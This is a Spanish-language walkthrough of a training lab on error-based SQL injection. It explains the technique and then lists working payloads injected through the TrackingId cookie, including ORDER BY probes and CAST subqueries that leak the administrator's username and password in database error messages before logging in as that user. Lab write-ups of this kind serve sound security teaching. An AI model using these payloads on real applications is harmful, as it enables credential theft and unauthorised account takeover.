# 💉 Inyección SQL basada en errores visibles

## 📄 Descripción del laboratorio

Este laboratorio contiene una vulnerabilidad de **SQL Injection basada en errores visibles**.\
La aplicación utiliza una cookie llamada `TrackingId` para realizar análisis internos, y su valor se inserta directamente en una consulta SQL.

En este escenario:

* Los resultados de la consulta **no se devuelven directamente**.
* Cuando la consulta provoca un **error SQL**, la aplicación muestra un **mensaje de error detallado**.

El objetivo es aprovechar esos mensajes para filtrar la contraseña del usuario **administrator** y autenticarnos en su cuenta.



## 📚 Teoría

### 📌 SQL Injection basada en errores

La **error-based SQL Injection** es una variante de SQLi que aprovecha los mensajes de error del motor de base de datos para extraer información.

Cuando una aplicación muestra errores detallados en producción, estos pueden revelar:

* Fragmentos de la consulta SQL ejecutada.
* Mensajes de conversión o de tipo de datos.
* Valores que causaron el error.

Esto convierte los mensajes de error en un **canal de exfiltración de datos**.

La estrategia general consiste en:

1. Confirmar la inyección SQL provocando un error de sintaxis.
2. Forzar errores de conversión o tipo de datos.
3. Hacer que el valor sensible aparezca dentro del mensaje de error.
4. Ajustar las subconsultas para que devuelvan una sola fila.

Este tipo de vulnerabilidad es muy realista, ya que muchas aplicaciones mal configuradas muestran mensajes de error completos sin darse cuenta de que pueden revelar datos sensibles.



## 📝 Práctica

### 1️⃣ Confirmar la inyección SQL

Interceptamos una petición HTTP y modificamos la cookie vulnerable:

```
TrackingId=abc'
```

Recargamos la página.

Resultado:

La aplicación devuelve un **mensaje de error detallado** que incluye fragmentos de la consulta SQL.

Esto confirma que existe una **SQL Injection basada en errores visibles**.



### 2️⃣ Determinar el número de columnas

Enviamos la petición al **Repeater** y probamos con `ORDER BY`.

```
TrackingId=abc' ORDER BY 1--
TrackingId=abc' ORDER BY 2--
```

Resultados:

```
ORDER BY 1 → funciona (200 OK)
ORDER BY 2 → error o comportamiento distinto
```

Conclusión: la consulta original devuelve **una sola columna**.

### 3️⃣ Comprobar si UNION es viable

Intentamos utilizar `UNION SELECT`, pero aparecen errores de tipo o incompatibilidad.

Esto indica que **no podemos reflejar resultados directamente en la respuesta**, por lo que utilizaremos una técnica basada en errores.



### 4️⃣ Forzar errores de tipo con CAST

La idea es provocar un error de conversión intentando convertir texto a entero.

Primer intento:

```
TrackingId=abc' OR 1=CAST((SELECT username FROM users) AS INT)-- -
```

<img width="1520" height="615" alt="image" src="https://github.com/user-attachments/assets/62323f5a-301d-495f-9d92-4ecbe874a8a9" />
<br>

Resultado:

Aparece un error indicando que la subconsulta devuelve más de una fila.

Esto confirma que:

* Existe una tabla llamada `users`.
* Contiene múltiples registros.



### 5️⃣ Limitar la subconsulta a una sola fila

Para evitar el error anterior, limitamos la subconsulta a una sola fila.

```
TrackingId=abc' OR 1=CAST((SELECT username FROM users LIMIT 1) AS INT)-- -
```

<img width="1520" height="612" alt="image" src="https://github.com/user-attachments/assets/536efd24-5ea9-4a5b-87e8-af79de708e30" />
<br>

Resultado:

La aplicación devuelve un error de conversión similar a:

```
invalid input syntax for integer: "administrator"
```

El valor **administrator** aparece directamente en el mensaje de error.

Esto confirma que hemos filtrado el primer nombre de usuario.



### 6️⃣ Extraer la contraseña

Aplicamos la misma técnica para obtener la contraseña.

Payload:

```
TrackingId=abc' OR 1=CAST((SELECT password FROM users LIMIT 1) AS INT)-- -
```

<img width="1520" height="622" alt="image" src="https://github.com/user-attachments/assets/15507ba7-f61c-4503-a8b1-c4f0698d2655" />
<br>

Resultado:

La aplicación devuelve un error de conversión que incluye la contraseña del primer usuario.

La contraseña del usuario **administrator** queda expuesta dentro del mensaje de error.



### 7️⃣ Iniciar sesión como administrator

Accedemos al formulario de login e introducimos:

```
Username: administrator
Password: contraseña extraída
```

La autenticación se realiza correctamente.

<img width="1288" height="706" alt="image" src="https://github.com/user-attachments/assets/1e19d16f-2659-4af0-bcca-0e7e2e8f3990" />



### 8️⃣ Resultado

Mediante una **SQL Injection basada en errores visibles** se ha conseguido:

* Confirmar la vulnerabilidad en la cookie `TrackingId`.
* Utilizar errores de conversión para exfiltrar datos.
* Obtener el nombre de usuario y contraseña del administrador.
* Iniciar sesión como **administrator**.
